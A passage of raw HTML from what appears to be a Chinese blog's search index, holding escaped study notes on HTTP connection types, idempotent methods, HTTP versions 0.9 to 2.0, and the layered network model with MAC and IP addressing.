&lt;p&gt;&lt;a href=&#34;https://mp.weixin.qq.com/s/NIjxgx4NPn7FC4PfkHBAAQ&#34;&gt;车小胖谈网络&lt;/a&gt;&lt;/p&gt;
">51-http-4-TCPIP三次握手</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/http-lian-jie-guan-li/"" data-c="
          &lt;h1 id=&#34;http-连接管理&#34;&gt;http-连接管理&lt;/h1&gt;
&lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;http连接的几种方式：串行连接、并行连接、持久连接、管道化连接……&lt;/p&gt;
&lt;h2 id=&#34;分类&#34;&gt;分类&lt;/h2&gt;
&lt;h3 id=&#34;串行连接&#34;&gt;串行连接&lt;/h3&gt;
&lt;p&gt;也称为短连接、短轮询。&lt;/p&gt;
&lt;p&gt;HTTP事务需要按顺序进行传输，等待服务端完成处理并回传。&lt;/p&gt;
&lt;p&gt;缺点：&lt;/p&gt;
&lt;p&gt;每次HTTP通信后都要断开TCP连接，所以每个新的HTTP请求都需要建立一个新的tcp连接，极大的增加了通信开销。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1625668312340.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;并行连接&#34;&gt;并行连接&lt;/h3&gt;
&lt;p&gt;并发的执行多条HTTP请求，且每个请求都有自己的TCP连接。&lt;/p&gt;
&lt;p&gt;特点：&lt;/p&gt;
&lt;p&gt;并行连接的速度可能会更快，但不一定总是更快。&lt;/p&gt;
&lt;p&gt;实际上多条连接会产生一些额外的开销，使用并行连接装载整个页面所需的时间很可能比串行下载的时间更长。&lt;/p&gt;
&lt;p&gt;如果并行加载多个对象，每个对象都会去竞争这有限的带宽，每个对象都会以比较慢的速度按比例加载，这样带来的性能提升就很小，甚至没什么提升。&lt;/p&gt;
&lt;p&gt;而且打开大量连接会消耗很多内存资源，从而引发自身的性能问题。&lt;/p&gt;
&lt;p&gt;假如一百个用户同时发出申请，每个用户打开100个连接，服务器就要处理10 000个连接。这会造成服务器性能的严重下降。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;实际上，浏览器确实使用了并行连接，但它们并行连接的总数限制为一个较小的值(通常是4个)。&lt;/p&gt;
&lt;p&gt;服务器可以随意的关闭来自特定客户端的超量连接。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1625668321507.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;持久连接&#34;&gt;持久连接&lt;/h3&gt;
&lt;p&gt;也叫长连接、长轮询&lt;/p&gt;
&lt;p&gt;在事务处理结束之后仍然保持在打开状态的TCP连接称为持久连接。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;方式&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;持久连接有两种方式，分别为HTTP/1.0+的“Keep-alive”连接，以及HTTP/1.1的“persistent”连接。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Keep-alive&lt;/strong&gt;：该首部只是请求将连接保持在活跃状态，客户端和服务端可以随时关闭空闲的Keep-alive连接。&lt;/p&gt;
&lt;p&gt;限制和规则：&lt;/p&gt;
&lt;p&gt;1、必须客户端发送一个Connection：Keep-alive请求首部来激活Keep-alive连接，服务端不一定答应启用Keep-Alive会话；&lt;/p&gt;
&lt;p&gt;2、必须随每个希望保持持久连接的请求的头部一起发送，如果某个请求没有带Keep-Alive头部，则服务器会在这个请求后关闭该连接。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;Persistent&lt;/strong&gt;：该首部默认情况下是激活的，除非特别指明，否则HTTP/1.1假定所有连接都是持久的。&lt;/p&gt;
&lt;p&gt;限制和规则：&lt;/p&gt;
&lt;p&gt;1、发送了 Connection: close 请求首部之后，客户端就无法在那条连接上发送更多的请求了。&lt;/p&gt;
&lt;p&gt;如果客户端不想在连接上发送其他请求了，就应该在最后一条请求中发送一个Connection: close 请求首部。&lt;/p&gt;
&lt;p&gt;2、只有当连接上所有的报文都有正确的、自定义报文长度时——也就是说，实体主体部分的长度都和相应的Content-Length 一致，或者是用分块传输编码方式编码的——连接才能持久保持。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1625668334800.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;管道化连接&#34;&gt;管道化连接&lt;/h3&gt;
&lt;p&gt;在持久连接的基础上可选的使用请求管道。在响应到达之前，可以将多条请求放入队列。&lt;/p&gt;
&lt;p&gt;限制：&lt;/p&gt;
&lt;p&gt;1、如果HTTP客户端无法确认连接是持久的,就不应该使用管道。&lt;/p&gt;
&lt;p&gt;2、必须按照与请求相同的顺序回送HTTP响应。HTTP报文中没有序列号标签,因此如果收到的响应失序了,就没办法将其与请求匹配起来了。&lt;/p&gt;
&lt;p&gt;3、HTTP 客户端必须做好连接会在任意时刻关闭的准备,还要准备好重发所有未完成的管道化请求。如果客户端打开了一条持久连接,并立即发出了10条请求,服务器可能在只处理了,比方说,5条请求之后关闭连接。剩下的5 条请求会失败,客户端必须能够应对这些过早关闭连接的情况,重新发出这些请求。&lt;/p&gt;
&lt;p&gt;4、HTTP 客户端不应该用管道化的方式发送会产生副作用的请求(比如POST)。总之,出错的时候,管道化方式会阻碍客户端了解服务器执行的是一系列管道化请求中的哪一些。由于无法安全地重试POST这样的&lt;strong&gt;非幂等请求&lt;/strong&gt;,所以出错时,就存在某些方法永远不会被执行的风险。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1625668345578.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;幂等请求&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;所谓幂等就是 多次执行对资源的影响，和一次执行对资源的影响相同。不管进行多少次重复操作，都是实现相同的结果。&lt;/p&gt;
&lt;p&gt;幂等保证在pipeline中的所有请求可以不必关心发送次序和到达服务器后执行的次序，即使多次请求，返回的结果一直是一样的。&lt;/p&gt;
&lt;p&gt;反之，若其中包含了不幂等的请求，两个请求，第一个是更新用户张三信息，第二请求是获取更新后的张三最新信息。 他们是按照次序顺序在服务器端执行的：1先执行，2紧接着执行。 但是&lt;strong&gt;后一个请求不会等前一个请求完成才执行&lt;/strong&gt;， 即可能 获取张三最新信息的2号请求先&lt;strong&gt;执行完成&lt;/strong&gt;，这样返回的信息就不是期望的了。&lt;/p&gt;
&lt;p&gt;所有请求虽然是按次序到达执行，&lt;strong&gt;但是不能保证一定是按照次序依次执行&lt;/strong&gt;，比如1，2两个请求顺序到达，1是更新用户信息，2是获取这个更新用户的最新信息，1先执行，2不等1执行完就开始执行，得到的用户信息是旧的。&lt;/p&gt;
&lt;p&gt;即，依次发了1，2，3这三个请求。如果1和2和3不是幂等的，即2可能要依赖1的返回，3可能要依赖1和2的返回，此种情况下就不能通过pipeline来进行发送。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;REST请求按幂等区分&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;GET请求很好理解，对资源做查询多次，此实现的结果都是一样的。&lt;/p&gt;
&lt;p&gt;PUT请求的幂等性可以这样理解，将A修改为B，它第一次请求值变为了B，再进行多次此操作，最终的结果还是B，与一次执行的结果是一样的，所以PUT是幂等操作。&lt;/p&gt;
&lt;p&gt;DELETE请求，第一次将资源删除后，后面多次进行此删除请求，最终结果是一样的，将资源删除掉了。&lt;/p&gt;
&lt;p&gt;POST不是幂等操作，因为一次请求添加一份新资源，二次请求则添加了两份新资源，多次请求会产生不同的结果，因此POST不是幂等操作。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;比较容易混淆的是HTTP POST和PUT。POST和PUT的区别容易被简单地误认为“POST表示创建资源，PUT表示更新资源”；而实际上，二者均可用于创建资源，更为本质的差别是在幂等性方面。在HTTP规范中对POST和PUT是这样定义的：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The POST method is used to request that the origin server accept the entity enclosed in the request as a new subordinate of the resource identified by the Request-URI in the Request-Line ...... If a resource has been created on the origin server, the response SHOULD be 201 (Created) and contain an entity which describes the status of the request and refers to the new resource, and a Location header.&lt;/p&gt;
&lt;p&gt;The PUT method requests that the enclosed entity be stored under the supplied Request-URI. If the Request-URI refers to an already existing resource, the enclosed entity SHOULD be considered as a modified version of the one residing on the origin server. If the Request-URI does not point to an existing resource, and that URI is capable of being defined as a new resource by the requesting user agent, the origin server can create the resource with that URI.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;POST所对应的URI并非创建的资源本身，而是资源的接收者。比如：POST &lt;code&gt;createArticles&lt;/code&gt;的语义是在目标网站下创建一篇帖子，HTTP响应中应包含帖子的创建状态以及帖子的URI。两次相同的POST请求会在服务器端创建两份资源，它们具有不同的URI；所以，POST方法不具备幂等性。而PUT所对应的URI是要创建或更新的资源本身。比如：PUT &lt;code&gt;updateArticles/4231&lt;/code&gt;的语义是创建或更新ID为4231的帖子。对同一URI进行多次PUT的副作用和一次PUT是相同的；因此，PUT方法具有幂等性。&lt;/p&gt;
">50-http-3-连接管理</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/http-ban-ben-li-shi/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;现在使用的HTTP协议有几个版本。HTTP程序要尽量强健地处理各种不同的HTTP协议变体。&lt;/p&gt;
&lt;p&gt;http请求是要通过tcp去建立连接，并在此之上发送数据,http只有请求和响应这个概念，没有链接这个概念。&lt;/p&gt;
&lt;p&gt;http1.0的时候，在http request的时候，在里面发起三次握手，创建TCP链接，然后再发起请求，请求结束后则关闭TCP链接。&lt;/p&gt;
&lt;p&gt;http1.1可以通过声明这个链接，可以保持在那里，后面就不需要三次握手开销;但是在一个tcp连接上同时只能发送一个请求，所以在有并发请求的时候只能建立多个tcp连接。&lt;/p&gt;
&lt;p&gt;HTTP2中是可以在一个TCP连接同时中发送多个HTTP请求。&lt;/p&gt;
&lt;h2 id=&#34;版本&#34;&gt;版本&lt;/h2&gt;
&lt;h3 id=&#34;http09&#34;&gt;HTTP/0.9&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;特点&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;HTTP/0.9只支持GET方法。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;不支持多媒体内容的MIME类型、各种HTTP首部，或者版本号。&lt;/p&gt;
&lt;p&gt;服务器发送完毕，就关闭TCP连接。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;命名&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;HTTP 于 1990 年问世。那时的 HTTP 并没有作为正式的标准被建立。&lt;/p&gt;
&lt;p&gt;实含有 HTTP1.0 之前版本的意思，因此被称为HTTP/0.9。&lt;/p&gt;
&lt;h3 id=&#34;http10&#34;&gt;HTTP/1.0&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;特点&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;HTTP/1.0添加了status code、header(各种HTTP首部)、版本号、一些额外的方法。&lt;/p&gt;
&lt;p&gt;多字符集支持、多部分发送、权限、缓存等。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;每次请求都打开一个新的TCP链接，收到响应之后立即断开连接。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;命名&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;HTTP 正式作为标准被公布是在 1996 年的 5 月，版本被命名为HTTP/1.0，并记载于 &lt;a href=&#34;https://www.ietf.org/rfc/rfc1945.txt&#34;&gt;RFC1945&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;虽说是初期标准，但该协议标准至今仍被广泛使用在服务器端。&lt;/p&gt;
&lt;h3 id=&#34;http11&#34;&gt;HTTP/1.1&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;特点&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;持久化&#34;&gt;持久化&lt;/h4&gt;
&lt;p&gt;&lt;u&gt;HTTP/1.1 默认开启持久连接，在一个TCP连接上可以传送多个HTTP请求和响应，减少了建立和关闭连接的消耗和延迟。&lt;/u&gt;&lt;/p&gt;
&lt;p&gt;在1.0版本中，每进行一次HTTP通信就要断开一次TCP连接。&lt;/p&gt;
&lt;p&gt;TCP连接的新建成本很高，频繁地打开关闭会极大地增加开销，影响性能。&lt;/p&gt;
&lt;p&gt;于是在1.1版本中引入持久连接的方法。其特点就是任意一端没有明确提出断开连接，则保持TCP连接的状态。&lt;/p&gt;
&lt;h4 id=&#34;管线化&#34;&gt;管线化&lt;/h4&gt;
&lt;p&gt;&lt;u&gt;HTTP/1.1增加了pipeline支持。&lt;/u&gt;&lt;/p&gt;
&lt;p&gt;管线化的连接建立在持久化连接的基础上，且响应需要顺序返回。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1625583403314.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;非管线化的请求：如上图中第一幅&lt;/p&gt;
&lt;p&gt;客户端发送一个请求之后，必须等待服务器响应之后才能发送下一个请求，不能同时并行发送多个请求。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;管线化的请求：如上图中第二幅&lt;/p&gt;
&lt;p&gt;客户端一次性发送多个请求，不用等待服务器响应就可以发送下一个请求。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;队头阻塞&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;管线化：如上图中第三幅&lt;/p&gt;
&lt;p&gt;http1.1规定，服务器端的响应的发送要根据请求被接收的顺序排队，即先接收到的请求需要先响应回来。所以当第一个请求阻塞后，后面的请求都需要等待。&lt;/p&gt;
&lt;p&gt;请求可以并行发出，但是响应必须串行返回。后一个响应必须在前一个响应之后。原因是，没有序号标明顺序，只能串行接收，阻塞发生在服务端，http响应阻塞。&lt;/p&gt;
&lt;p&gt;非管线化: 如上图中第一幅&lt;/p&gt;
&lt;p&gt;后一个请求必须在前一个响应之后发送，发生在客户端，http请求阻塞。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;HTTP2多路复用：如上图中第四幅&lt;/p&gt;
&lt;p&gt;解决第二个请求不被第一个请求阻塞，最好的办法就是来两个TCP连接。传统上浏览器也是这么干的。但是TCP要握手，这个效率低，所以HTTP2把多个这种请求流塞到一个TCP连接里面，这样的连接复用方式就提高了效率，又节省了连接握手。&lt;/p&gt;
&lt;p&gt;为了解决HTTP1.1管线化队头阻塞的问题，http2中，将多个请求复用到同一个tcp通道中，通过&lt;strong&gt;二进制分帧&lt;/strong&gt;并且&lt;strong&gt;给每个帧&lt;/strong&gt;打上&lt;strong&gt;流&lt;/strong&gt;的 &lt;strong&gt;ID&lt;/strong&gt; 去避免依次响应的问题，对方接收到帧之后&lt;strong&gt;根据 ID 拼接出流&lt;/strong&gt;，这样就可以做到乱序响应从而避免请求时的队首阻塞问题。&lt;/p&gt;
&lt;p&gt;但是HTTP2没有完全解决队头阻塞问题，因为实际中TCP的连接buffer有限，一个响应又慢，又大的请求会把链接buffer完全占满，导致buffer阻塞，从而导致跟队头阻塞一样的效果。&lt;/p&gt;
&lt;h4 id=&#34;增加host字段&#34;&gt;增加HOST字段&lt;/h4&gt;
&lt;p&gt;HTTP/1.1 的请求消息和响应消息都必须包含&lt;code&gt;Host&lt;/code&gt;头部，以区分同一个物理主机中的不同虚拟主机的域名。&lt;/p&gt;
&lt;p&gt;1.0版本中，认为每台物理服务器对应唯一的IP地址。所以，在1.0版本中是没有主机名这个概念的。但随着Web技术的发展，一台物理服务器可以存在多个虚拟主机，他们共享同一个IP地址。为了解决这个问题，HOST字段应运而生。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;命名&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1997 年 1 月公布的 HTTP/1.1 是目前主流的 HTTP 协议版本。当初的标准是 RFC2068，之后发布的修订版 &lt;a href=&#34;https://www.ietf.org/rfc/rfc2616.txt&#34;&gt;RFC2616&lt;/a&gt; 就是当前的最新版本。&lt;/p&gt;
&lt;h3 id=&#34;http20&#34;&gt;HTTP/2.0&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;特点&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;二进制分帧&#34;&gt;二进制分帧&lt;/h4&gt;
&lt;p&gt;在HTTP协议2.0中，应用层和传输层之间会多一个二进制分帧层。在二进制分帧层上，HTTP 2.0 会将所有传输的信息分割为更小的帧,并对它们采用二进制格式的编码 。之前HTTP1.x版本中的HTTP报文首部信息会被封装到Headers帧，而我们的HTTP报文主体则封装到Data帧里面。原先我们是以HTTP报文为单位传输的，现在HTTP报文被拆成了多个帧的形式，并且这些帧可以乱序发送，我们只需根据每个帧首部的流标识符就可以重新完成组装。这样极大提升了HTTP的性能。&lt;/p&gt;
&lt;h4 id=&#34;多路复用&#34;&gt;多路复用&lt;/h4&gt;
&lt;p&gt;HTTP/2.0支持多路复用，就是在一个 TCP 连接中可以存在多条流，也就是可以发送多个请求，服务端则可以通过帧中的标识知道该帧属于哪个流（即请求），通过重新排序还原请求。多路复用允许并发的发起多个请求，每个请求及该请求的响应不需要等待其他的请求或响应，避免了队头阻塞问题。这样某个请求任务耗时严重，不会影响到其它连接的正常执行,极大的提高传输性能。&lt;/p&gt;
&lt;h4 id=&#34;头部压缩&#34;&gt;头部压缩&lt;/h4&gt;
&lt;p&gt;每次HTTP请求都会有一个请求首部，这个首部放到一些重要信息，比如Cookie、User Agent之类的字段，这些字段每次请求都是一样的，但还必须要带上。这就造成了一些不必要的浪费。2.0中就优化这一点，引入首部压缩机制，客户端和服务端会维护同样一张首部信息表，每次请求只要发送索引号就可以了，不必带上请求首部上冗余的key-value，极大地减少了不必要的浪费。&lt;/p&gt;
&lt;h4 id=&#34;服务端推送&#34;&gt;服务端推送&lt;/h4&gt;
&lt;p&gt;在2.0之前的版本中，服务端是属于被动一方，只有客户端发送请求，服务端才能发送资源。2.0协议中，服务端可以主动地向客户端发送资源。例如：客户端请求一个html，里面所需要的js和css完全不需要客户端解析完html之后再去请求这些内容那么麻烦，服务端可以在客户端请求html的时候一起回传过来。&lt;/p&gt;
&lt;h2 id=&#34;推荐阅读&#34;&gt;推荐阅读&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;阮一峰&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.ruanyifeng.com/blog/2016/08/http.html&#34;&gt;HTTP 协议入门&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
">49-http-2-版本历史</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/http-wang-luo-mo-xing/"" data-c="
          &lt;h1 id=&#34;http-五层网络模型&#34;&gt;http-五层网络模型&lt;/h1&gt;
&lt;h2 id=&#34;1概述&#34;&gt;1.概述&lt;/h2&gt;
&lt;h3 id=&#34;11协议&#34;&gt;1.1协议&lt;/h3&gt;
&lt;p&gt;协议，网络协议的简称，网络协议是通信计算机双方必须共同遵从的一组约定。如怎么样建立连接、怎么样互相识别等。只有遵守这个约定，计算机之间才能相互通信交流。&lt;/p&gt;
&lt;p&gt;为了使数据在网络上从源到达目的，网络通信的参与方必须遵循相同的规则，这套规则称为协议（protocol），它最终体现为在网络上传输的数据包的格式。&lt;/p&gt;
&lt;p&gt;协议往往分成几个层次进行定义，分层定义是为了使某一层协议的改变不影响其他层次的协议。&lt;/p&gt;
&lt;h3 id=&#34;12网络模型&#34;&gt;1.2网络模型&lt;/h3&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1625500448131.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h4 id=&#34;121四层&#34;&gt;1.2.1四层&lt;/h4&gt;
&lt;p&gt;TCP/IP 协议族是Internet最基本的协议，按照是否具有TCP/IP 协议族的协议来划分的话，从下到上为：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;链路层&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;用来处理连接网络的硬件部分，包括控制操作系统、硬件的设备驱动、NIC（Network Interface Card，网络适配器，即网卡），及光纤等物理可见部分（还包括连接器等一切传输媒介）。硬件上的范畴均在链路层的作用范围之内。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;网络层&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;网络层规定了数据通过怎样的传输路线到达对方计算机传送给对方（IP协议等）。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;传输层&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;传输层对接上层应用层，提供处于网络连接中两台计算机之间的数据传输所使用的协议。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;应用层&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;应用层规定了向用户提供应用服务时通信的协议。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;122七层&#34;&gt;1.2.2七层&lt;/h4&gt;
&lt;p&gt;国际标准化组织（ISO）为了规范协议层次的划分制定了开发系统互联（OSI，Open Systems Interconnection）模型，即ISO/OSI参考模型。此模型根据网络功能制定出7层网络协议结构，由低到高分别为物理层、数据链路层、网络层、传输层、会话层、表示层和应用层。&lt;/p&gt;
&lt;h4 id=&#34;123五层&#34;&gt;1.2.3五层&lt;/h4&gt;
&lt;p&gt;五层网络模型分别为：物理层，数据链路层，网络层，传输层，应用层。&lt;/p&gt;
&lt;p&gt;物理层：主要作用是定义物理设备如何传输数据。&lt;/p&gt;
&lt;p&gt;数据链路层：在通信的实体间建立数据链路连接。&lt;/p&gt;
&lt;p&gt;网络层：为数据在结点之间传输创建逻辑链路。&lt;/p&gt;
&lt;p&gt;传输层：为应用层实体提供端到端的通信功能。&lt;/p&gt;
&lt;p&gt;应用层：为应用软件提供了很多服务。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1625500557587.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;13层与协议&#34;&gt;1.3层与协议&lt;/h3&gt;
&lt;p&gt;每一层都是为了完成一种功能。为了实现这些功能，就需要大家都遵守共同的规则。&lt;/p&gt;
&lt;p&gt;大家都遵守的规则，就叫做&amp;quot;协议&amp;quot;（protocol）。&lt;/p&gt;
&lt;p&gt;互联网的每一层，都定义了很多协议。这些协议集合起来总称为TCP/IP&lt;/p&gt;
&lt;h2 id=&#34;2五层网络模型详解&#34;&gt;2.五层网络模型详解&lt;/h2&gt;
&lt;p&gt;数据包格式：&lt;br&gt;
&lt;img src=&#34;https://leecss.com/post-images/1625500599926.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;21系统的角度&#34;&gt;2.1系统的角度&lt;/h3&gt;
&lt;h4 id=&#34;211物理层&#34;&gt;2.1.1物理层&lt;/h4&gt;
&lt;p&gt;光缆、电缆、双绞线、无线电波等方式，&lt;u&gt;把电脑连接起来的物理手段&lt;/u&gt;。&lt;/p&gt;
&lt;p&gt;它主要规定了网络的一些电气特性，&lt;u&gt;作用是负责传送0和1的电信号。&lt;/u&gt;&lt;/p&gt;
&lt;h4 id=&#34;212数据链路层&#34;&gt;2.1.2数据链路层&lt;/h4&gt;
&lt;p&gt;在&amp;quot;实体层&amp;quot;的上方，&lt;u&gt;确定了0和1的分组方式。&lt;/u&gt;&lt;/p&gt;
&lt;p&gt;有了数据包的定义、网卡的MAC地址、广播的发送方式，&amp;quot;链接层&amp;quot;就可以在多台计算机之间传送数据了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;以太网协议&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;以太网规定，一组电信号构成一个数据包，叫做&amp;quot;帧&amp;quot;（Frame）。每一帧分成两个部分：标头（Head）和数据（Data）。&lt;/p&gt;
&lt;p&gt;&amp;quot;标头&amp;quot;包含数据包的一些说明项，比如发送者、接受者、数据类型等等；&amp;quot;数据&amp;quot;则是数据包的具体内容。&lt;/p&gt;
&lt;p&gt;&amp;quot;标头&amp;quot;的长度，固定为18字节。&amp;quot;数据&amp;quot;的长度，最短为46字节，最长为1500字节。因此，整个&amp;quot;帧&amp;quot;最短为64字节，最长为1518字节。如果数据很长，就必须分割成多个帧进行发送。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;MAC地址&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;以太网规定，连入网络的所有设备，都必须具有&amp;quot;网卡&amp;quot;接口。数据包必须是从一块网卡，传送到另一块网卡。网卡的地址，就是数据包的发送地址和接收地址，这叫做MAC地址。&lt;/p&gt;
&lt;p&gt;每块网卡出厂的时候，都有一个AC地址，重复概率很小。长度是48个二进制位，通常用12个十六进制数表示。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;# MAC Address
00-B0-D0-86-BB-F7
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;前6个十六进制数是厂商编号，后6个是该厂商的网卡流水号。有了MAC地址，就可以定位网卡和数据包的路径了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;广播&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;早期，以太网采用了一种很原始的方式来识别&lt;strong&gt;服务器&lt;/strong&gt;网卡的地址，它不是把数据包准确送到接收方，而是向本网络内所有计算机发送，让每台计算机自己判断，是否为接收方。&lt;/p&gt;
&lt;p&gt;同一子网络下所有计算机都会收到&lt;strong&gt;客户端&lt;/strong&gt;发出的数据包。它们读取这个包的&amp;quot;标头&amp;quot;，找到接收方的MAC地址，然后与自身的MAC地址相比较，如果两者相同，就接受这个包，做进一步处理，否则就丢弃这个包。这种发送方式就叫做&amp;quot;广播&amp;quot;（broadcasting）。&lt;/p&gt;
&lt;h4 id=&#34;213网络层&#34;&gt;2.1.3网络层&lt;/h4&gt;
&lt;p&gt;互联网是无数子网络共同组成的一个巨型网络，如果客户端与服务器不在一个子网络内，则无法通过广播的方式识别对方。&lt;/p&gt;
&lt;p&gt;网络层引进一套新的地址，使得我们能够&lt;u&gt;区分不同的计算机是否属于同一个子网络&lt;/u&gt;。这套地址就叫做&amp;quot;网络地址&amp;quot;，简称&amp;quot;网址&amp;quot;。&lt;/p&gt;
&lt;p&gt;于是，&amp;quot;网络层&amp;quot;出现以后，每台计算机有了两种地址，一种是MAC地址，另一种是网络地址。&lt;/p&gt;
&lt;p&gt;两种地址之间没有任何联系，MAC地址是绑定在网卡上的，网络地址则是管理员分配的，它们只是随机组合在一起。&lt;/p&gt;
&lt;p&gt;网络地址帮助我们确定计算机所在的子网络，MAC地址则将数据包送到该子网络中的目标网卡。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;IP协议&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;规定网络地址的协议，叫做IP协议。它所定义的地址，就被称为IP地址。&lt;/p&gt;
&lt;p&gt;IP协议的作用主要有两个，&lt;u&gt;一个是为每一台计算机分配IP地址，另一个是确定哪些地址在同一个子网络。&lt;/u&gt;&lt;/p&gt;
&lt;p&gt;目前，广泛采用的是IP协议第四版，简称IPv4。这个版本规定，网络地址由32个二进制位组成。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;# IP Address
172.16.254.1
10101100.00010000.11111110.00000001
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;习惯上，我们用分成四段的十进制数表示IP地址，从0.0.0.0一直到255.255.255.255。&lt;/p&gt;
&lt;p&gt;互联网上的每一台计算机，都会分配到一个IP地址。这个地址分成两个部分，前一部分代表网络，后一部分代表主机。比如，IP地址172.16.254.1，这是一个32位的地址，假定它的网络部分是前24位（172.16.254），那么主机部分就是后8位（最后的那个1）。处于同一个子网络的电脑，它们IP地址的网络部分必定是相同的，也就是说172.16.254.2应该与172.16.254.1处在同一个子网络。&lt;/p&gt;
&lt;p&gt;但是，问题在于单单从IP地址，我们无法判断网络部分。还是以172.16.254.1为例，它的网络部分，到底是前24位，还是前16位，甚至前28位，从IP地址上是看不出来的。&lt;/p&gt;
&lt;p&gt;那么，怎样才能从IP地址，判断两台计算机是否属于同一个子网络呢？这就要用到另一个参数&amp;quot;子网掩码&amp;quot;（subnet mask）。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;子网掩码&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;所谓&amp;quot;子网掩码&amp;quot;，就是表示子网络特征的一个参数。它在形式上等同于IP地址，也是一个32位二进制数字，它的网络部分全部为1，主机部分全部为0。比如，IP地址172.16.254.1，如果已知网络部分是前24位，主机部分是后8位，那么子网络掩码就是11111111.11111111.11111111.00000000，写成十进制就是255.255.255.0。&lt;/p&gt;
